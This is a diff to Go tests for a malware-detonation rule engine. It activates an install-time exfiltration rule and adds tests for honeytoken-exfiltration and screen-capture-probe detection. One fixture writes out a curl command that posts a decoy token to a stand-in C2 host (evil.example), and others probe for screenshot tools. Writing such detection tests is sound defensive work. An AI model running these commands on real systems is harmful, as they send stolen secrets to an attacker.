@@ -4,6 +4,7 @@ package rules
 import (
 	"testing"
 
+	"detonation/internal/honeytokens"
 	"detonation/internal/trace"
 )
 
@@ -25,8 +26,8 @@ func TestInstallExfil(t *testing.T) {
 	if f.RuleID != "dyn_install_exfil" {
 		t.Errorf("rule_id = %q, want dyn_install_exfil", f.RuleID)
 	}
-	if f.Severity != "critical" {
-		t.Errorf("severity = %q, want critical", f.Severity)
+	if f.Severity != "high" {
+		t.Errorf("severity = %q, want high", f.Severity)
 	}
 }
 
@@ -43,11 +44,15 @@ func TestInstallExfilSkipsImport(t *testing.T) {
 	}
 }
 
-func TestInstallExfilNotInActiveSet(t *testing.T) {
+func TestInstallExfilActive(t *testing.T) {
+	found := false
 	for _, r := range AllRules() {
 		if r.ID == "dyn_install_exfil" {
-			t.Error("dyn_install_exfil must not be in AllRules() — deferred pending redesign")
+			found = true
 		}
+	}
+	if !found {
+		t.Error("dyn_install_exfil must be active in AllRules()")
 	}
 }
 
@@ -90,6 +95,77 @@ func TestCredentialRead(t *testing.T) {
 	}
 	if !matched {
 		t.Fatal("expected dyn_credential_read to match")
+	}
+}
+
+func TestHoneytokenExfilMatchesDecoyValueInArgs(t *testing.T) {
+	// a worm shells out to exfil a harvested decoy token in the curl args
+	decoy := honeytokens.Canaries()[0].Value
+	evt := trace.TraceEvent{
+		Phase:     "install",
+		Category:  "process",
+		Operation: "exec",
+		Detail:    map[string]interface{}{"arguments": "curl -s https://evil.example/c2 -d token=" + decoy},
+	}
+	var matched bool
+	for _, r := range AllRules() {
+		if f := r.Evaluate(evt); f != nil && f.RuleID == "dyn_honeytoken_exfil" {
+			matched = true
+			if f.Severity != "critical" {
+				t.Errorf("severity = %q, want critical", f.Severity)
+			}
+		}
+	}
+	if !matched {
+		t.Fatal("expected dyn_honeytoken_exfil to match a decoy value in exec args")
+	}
+}
+
+func TestHoneytokenExfilIgnoresCleanArgs(t *testing.T) {
+	evt := trace.TraceEvent{
+		Phase:     "install",
+		Category:  "process",
+		Operation: "exec",
+		Detail:    map[string]interface{}{"arguments": "npm install --ignore-scripts"},
+	}
+	for _, r := range AllRules() {
+		if f := r.Evaluate(evt); f != nil && f.RuleID == "dyn_honeytoken_exfil" {
+			t.Fatal("dyn_honeytoken_exfil must not fire on clean args")
+		}
+	}
+}
+
+func TestScreenCaptureProbeFiresOnToolEnumeration(t *testing.T) {
+	for _, args := range []string{"/usr/bin/which scrot", `-c "command -v gnome-screenshot"`, "which xinput"} {
+		evt := trace.TraceEvent{
+			Phase: "install", Category: "process", Operation: "exec",
+			Detail: map[string]interface{}{"arguments": args},
+		}
+		var matched bool
+		for _, r := range AllRules() {
+			if f := r.Evaluate(evt); f != nil && f.RuleID == "dyn_screen_capture_probe" {
+				matched = true
+			}
+		}
+		if !matched {
+			t.Errorf("expected dyn_screen_capture_probe to fire on %q", args)
+		}
+	}
+}
+
+func TestScreenCaptureProbeIgnoresClipboardAndNonProbe(t *testing.T) {
+	// clipboard tools excluded (legit clipboard libs probe them); and a bare
+	// reference without a which/command-v probe must not fire.
+	for _, args := range []string{"/usr/bin/which xclip", "node -e import('scrot')", "cp scrot.png /tmp"} {
+		evt := trace.TraceEvent{
+			Phase: "install", Category: "process", Operation: "exec",
+			Detail: map[string]interface{}{"arguments": args},
+		}
+		for _, r := range AllRules() {
+			if f := r.Evaluate(evt); f != nil && f.RuleID == "dyn_screen_capture_probe" {
+				t.Errorf("dyn_screen_capture_probe must not fire on %q", args)
+			}
+		}
 	}
 }
 
